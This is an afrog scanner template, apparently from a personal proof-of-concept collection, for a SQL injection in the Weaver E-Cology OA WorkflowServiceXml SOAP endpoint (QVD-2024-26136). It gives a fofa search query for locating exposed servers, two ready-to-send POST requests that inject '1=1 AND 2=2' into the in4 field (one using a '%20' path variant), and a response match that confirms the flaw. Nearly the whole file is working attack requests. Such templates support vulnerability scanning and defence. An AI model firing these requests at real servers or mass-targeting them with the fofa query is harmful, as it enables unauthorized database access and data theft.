mypocs/afrog/afrog-泛微E-Cology-WorkflowServiceXml-SQL注入漏洞.yaml

id: Weaver-E-Cology-WorkflowServiceXml-sql
info:
  name: 泛微E-Cology WorkflowServiceXml SQL注入漏洞(QVD-2024-26136)
  author: Superhero
  severity: high
  description: |-
    fofa: app="泛微-OA（e-cology）"
    泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140493841
  tags: sql injection


rules:
  r0:
    request:
      method: POST
      path: /services/WorkflowServiceXml
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
        Content-Type: text/xml
      body: '
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
          <soapenv:Header/>
            <soapenv:Body>
              <web:getHendledWorkflowRequestList>
                <web:in0>1</web:in0>
                <web:in1>1</web:in1>
                <web:in2>1</web:in2>
                <web:in3>1</web:in3>
                <web:in4>
                  <web:string>1=1 AND 2=2</web:string>
                </web:in4>
              </web:getHendledWorkflowRequestList>
            </soapenv:Body>
        </soapenv:Envelope>
       '  
    expression: response.status == 200 && response.body.bcontains(b'WorkflowRequestInfo') && response.body.bcontains(b'workflowName') && response.body.bcontains(b'lastOperatorName')

  r1:
    request:
      method: POST
      path: /services%20/WorkflowServiceXml
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
        Content-Type: text/xml
      body: '
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
          <soapenv:Header/>
            <soapenv:Body>
              <web:getHendledWorkflowRequestList>
                <web:in0>1</web:in0>
                <web:in1>1</web:in1>
                <web:in2>1</web:in2>
                <web:in3>1</web:in3>
                <web:in4>
                  <web:string>1=1 AND 2=2</web:string>
                </web:in4>
              </web:getHendledWorkflowRequestList>
            </soapenv:Body>
        </soapenv:Envelope>
       '  
    expression: response.status == 200 && response.body.bcontains(b'WorkflowRequestInfo') && response.body.bcontains(b'workflowName') && response.body.bcontains(b'lastOperatorName')

expression: r0() || r1()






